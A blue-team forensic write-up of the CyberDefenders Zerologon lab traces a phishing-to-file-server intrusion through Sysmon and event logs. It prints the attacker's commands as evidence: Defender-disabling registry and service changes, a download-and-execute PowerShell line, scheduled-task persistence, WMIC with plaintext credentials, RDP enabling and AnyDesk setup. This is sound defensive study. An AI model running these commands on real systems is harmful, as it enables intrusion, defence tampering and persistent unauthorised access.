---
title: "Zerologon Lab - DFIR Investigation Write-up"
date: "1 July 2026"
description: "DFIR write-up for the Zerologon Lab covering phishing delivery, Defender tampering, C2 beaconing, PowerShell discovery, scheduled-task persistence, lateral movement, AnyDesk installation, credential access, and collection."
tags: [DFIR, Windows Forensics, Active Directory, Lateral Movement]
---

## Overview

This lab investigated an intrusion across an Active Directory environment for EliteSystems Corp. The evidence showed an initial malicious email attachment, local execution on a user workstation, command-and-control traffic, PowerShell-based discovery, scheduled-task persistence, privilege escalation activity, lateral movement to a file server, remote access tooling, credential access, and local data staging.

Challenge source: [CyberDefenders Zerologon](https://cyberdefenders.org/blueteam-ctf-challenges/zerologon/)

The starting point was a downloaded archive that eventually led to `easygoing.exe` running from the user's temp directory. From there, Sysmon and Windows event logs tied the activity to a broader post-exploitation chain.

## Evidence and Tooling

The investigation used host artifacts from multiple systems, with most of the timeline reconstructed through Autopsy, Event Log Explorer, KAPE output, extracted files, Sysmon telemetry, PowerShell command lines, and hash lookups.

The key hosts and users that appeared in the evidence were:

- `ELITESYSTEMS\esmith` on the initially compromised workstation.
- `DC01.elitesystems.local` for domain-controller activity.
- `FileServer.elitesystems.local` for lateral movement and remote access tooling.
- `FileShareService`, which was used for access to the file server.

![Collected host artifacts](/static/images/blog/zerologon-1.png)

![Autopsy case used to review host artifacts](/static/images/blog/zerologon-2.png)

## Initial Execution

The malicious content was delivered in a `documents.zip` attachment from a suspicious email. The message included the archive password and directed the recipient toward the contents of the `max` folder.

![Phishing email containing the archive password and lure](/static/images/blog/zerologon-4.png)

Autopsy also showed the downloaded archive in the user's recent document activity, tying the email attachment to local execution on `esmith`'s workstation.

![Recent document evidence for documents.zip](/static/images/blog/zerologon-3.png)

The attachment was preserved in the user's Thunderbird mail profile, which helped confirm the email as the delivery source.

![Malicious documents.zip attachment in the mail profile](/static/images/blog/zerologon-5.png)

Inside the archive was `eyewear.bat`, which disabled Microsoft Defender protections, copied `easygoing.exe` into the user's temp directory, and executed it.

![Archive contents showing easygoing.exe and eyewear.bat](/static/images/blog/zerologon-6.png)

The batch file contained the following core logic:

```bat
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
sc config WinDefend start= disabled
sc stop WinDefend
xcopy /s /i /e /h max\easygoing.exe %LOCALAPPDATA%\Temp\*
start %LOCALAPPDATA%\Temp\easygoing.exe
```

![eyewear.bat execution logic](/static/images/blog/zerologon-8.png)

The payload landed at:

```text
C:\Users\esmith\AppData\Local\Temp\easygoing.exe
```

The local archive structure also contained the `max` folder that staged the executable before it was copied into `%LOCALAPPDATA%\Temp`.

![Extracted payload staging folder](/static/images/blog/zerologon-7.png)

Later temp-directory artifacts showed `easygoing.exe` alongside attacker output such as `found_shares.txt` and the suspicious `lsasss.exe` binary.

![Temp directory artifacts after execution](/static/images/blog/zerologon-9.png)

## Payload Triage

After identifying `easygoing.exe`, I calculated hashes and checked the file against external reputation data. VirusTotal marked the binary as malicious, and the metadata aligned with a loader or remote-access payload rather than a benign utility.

![Hashing suspicious executables](/static/images/blog/zerologon-10.png)

![VirusTotal detection for easygoing.exe](/static/images/blog/zerologon-11.png)

Another suspicious binary, `lsasss.exe`, was also flagged by VirusTotal. Its name was notable because masquerading as a Windows process is a common way to hide attacker tooling in plain sight.

![VirusTotal detection for lsasss.exe](/static/images/blog/zerologon-12.png)

Static capability triage showed behavior consistent with process and host interaction. The tooling also flagged MITRE ATT&CK style behaviors, including process enumeration and anti-analysis style checks.

![CAPA analysis of easygoing.exe](/static/images/blog/zerologon-14.png)

![CAPA analysis of lsasss.exe](/static/images/blog/zerologon-15.png)

## Command and Control

Sysmon network telemetry showed `easygoing.exe` connecting outbound over TCP to an external host:

```text
Source image: C:\Users\esmith\AppData\Local\Temp\easygoing.exe
Source user: ELITESYSTEMS\esmith
Destination IP: 42.63.200.142
Destination port: 80
Technique: T1036 Masquerading
Timestamp: 2024-01-02 08:28:46.122
```

The event data showed repeated traffic to the same attacker-controlled endpoint over several hours, which made this a strong C2 indicator rather than a one-off connection.

![Sysmon network connection evidence](/static/images/blog/zerologon-16.png)

## Discovery and Domain Enumeration

Later in the timeline, Sysmon process creation events showed `easygoing.exe` launching PowerShell with encoded commands. One decoded command exported all AD computer objects to a CSV in the user's temp directory:

```powershell
Get-ADComputer -Filter * -Properties * |
  Export-CSV "C:\Users\esmith\Appdata\Local\Temp\ADComputers.csv" -NoTypeInformation
```

This gave the attacker an inventory of domain computers for follow-on activity.

![Encoded PowerShell launched by easygoing.exe](/static/images/blog/zerologon-17.png)

A second decoded command loaded PowerView-style functionality and ran share discovery:

```powershell
IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:25816/');
Invoke-ShareFinder -CheckShareAccess -Verbose |
  Out-File -Encoding ascii C:\Users\esmith\Appdata\Local\Temp\found_shares.txt
```

The use of `Invoke-ShareFinder` suggests the attacker was looking for accessible file shares and possible lateral movement targets.

Additional discovery commands included:

```cmd
where /r C:\Windows\WinSxS\ *Microsoft.ActiveDirectory.Management.dll*
net group administrators /domain
netstat -anop tcp
nslookup DC01
```

These commands helped the attacker confirm available AD tooling, privileged groups, network connections, and the domain controller name.

## Persistence

Persistence was established through a scheduled task named `ChromeUpdater`:

```cmd
schtasks /create /tn "ChromeUpdater" /tr "powershell -File 'C:\Users\esmith\AppData\Local\ChromeUpdater\ChromeUpdate.ps1'" /sc onlogon /ru System
```

The task name was chosen to look like routine browser update activity, while the action pointed to an attacker-controlled PowerShell script under the user's local profile.

## Privilege Escalation and Named Pipe Activity

On the compromised workstation, Sysmon showed a SYSTEM-level command writing a token-like value into a named pipe:

```cmd
C:\Windows\system32\cmd.exe /c echo ddb867670d7 > \\.\pipe\308808
```

The parent process was `rundll32.exe`, and the command ran as `NT AUTHORITY\SYSTEM`. This pattern is consistent with named-pipe token impersonation tradecraft and fits the privilege-escalation phase of the intrusion.

## Lateral Movement

The attacker then moved toward the file server. One command used WMIC against `192.168.202.126` with explicit credentials:

```cmd
wmic /node:192.168.202.126 /user:FileShareService /password:MYpassword123# logicaldisk get caption,description,drivetype,providername,volumename
```

This indicates both a lateral movement attempt and credential use for the `FileShareService` account.

On `DC01`, WMI-backed commands also appeared. One command enabled RDP by modifying Terminal Services configuration:

```cmd
reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
```

Another command disabled Microsoft Defender through policy:

```cmd
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```

These actions show the attacker weakening host defenses while preparing interactive remote access.

## File Server Activity

On `FileServer.elitesystems.local`, Sysmon and Service Control Manager logs showed attacker activity under `NT AUTHORITY\SYSTEM`. The attacker installed AnyDesk for remote access:

```cmd
cmd.exe /C start anydesk.exe --install "C:\Program Files (x86)\AnyDesk" --start-with-win --create-desktop-icon
```

The service installation event showed:

```text
Service Name: AnyDesk Service
Service File Name: "C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --service
Service Start Type: auto start
Service Account: LocalSystem
```

The attacker also set an AnyDesk password:

```cmd
cmd.exe /C echo Qwerty123!@#_! | AnyDesk.exe --set-password
```

This gave the attacker persistent remote access independent of the original execution chain.

## Credential Access

The file server logs included Sysmon Event ID 10 activity against `lsass.exe`, mapped to credential dumping:

```text
Technique: T1003 Credential Dumping
Source image: C:\Windows\system32\rundll32.exe
Target image: C:\Windows\system32\lsass.exe
Granted access: 0x1010
User: NT AUTHORITY\SYSTEM
Timestamp: 2024-01-02 21:11:01.450
```

This strongly suggests credential access after the attacker established SYSTEM-level execution on the file server.

![LSASS access consistent with credential dumping](/static/images/blog/zerologon-18.png)

## Collection

The recovered `localdisk.ps1` script collected user profile data by compressing every directory under `C:\Users\` into `C:\Data`:

```powershell
$destinationPath = "C:\Data"

if (-not (Test-Path -Path $destinationPath)) {
    New-Item -ItemType Directory -Path $destinationPath
}

$directories = Get-ChildItem -Path "C:\Users\" -Directory

foreach ($dir in $directories) {
    $zipFileName = "$($dir.Name).zip"
    $zipFilePath = Join-Path $destinationPath $zipFileName
    Compress-Archive -Path $dir.FullName -DestinationPath $zipFilePath
    Write-Host "Compressed $($dir.FullName) to $zipFilePath"
}
```

The script created a straightforward local collection staging area:

```text
C:\Data\<username>.zip
```

## Indicators of Compromise

### Files and Paths

```text
C:\Users\esmith\AppData\Local\Temp\easygoing.exe
C:\Users\esmith\Appdata\Local\Temp\ADComputers.csv
C:\Users\esmith\Appdata\Local\Temp\found_shares.txt
C:\Users\esmith\AppData\Local\ChromeUpdater\ChromeUpdate.ps1
C:\Program Files (x86)\AnyDesk\AnyDesk.exe
C:\Data\<username>.zip
```

### Network Indicators

```text
42.63.200.142:80
192.168.202.126
http://127.0.0.1:25816/
```

### Commands

```cmd
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
sc config WinDefend start= disabled
sc stop WinDefend
schtasks /create /tn "ChromeUpdater" /tr "powershell -File 'C:\Users\esmith\AppData\Local\ChromeUpdater\ChromeUpdate.ps1'" /sc onlogon /ru System
C:\Windows\system32\cmd.exe /c echo ddb867670d7 > \\.\pipe\308808
wmic /node:192.168.202.126 /user:FileShareService /password:MYpassword123# logicaldisk get caption,description,drivetype,providername,volumename
cmd.exe /C start anydesk.exe --install "C:\Program Files (x86)\AnyDesk" --start-with-win --create-desktop-icon
cmd.exe /C echo Qwerty123!@#_! | AnyDesk.exe --set-password
```

## Conclusion

The intrusion began with a malicious email attachment that disabled Defender and launched `easygoing.exe` from the user's temp directory. Sysmon then showed outbound C2 traffic, encoded PowerShell discovery, AD computer enumeration, share discovery, scheduled-task persistence, and named-pipe activity consistent with privilege escalation.

The attacker later used explicit credentials to reach the file server, installed AnyDesk for persistent remote access, accessed the Windows LSASS process, and staged user profile data into ZIP archives. The strongest evidence came from joining process creation, network connection, service installation, PowerShell command-line, and file-system artifacts across the workstation, domain controller, and file server.
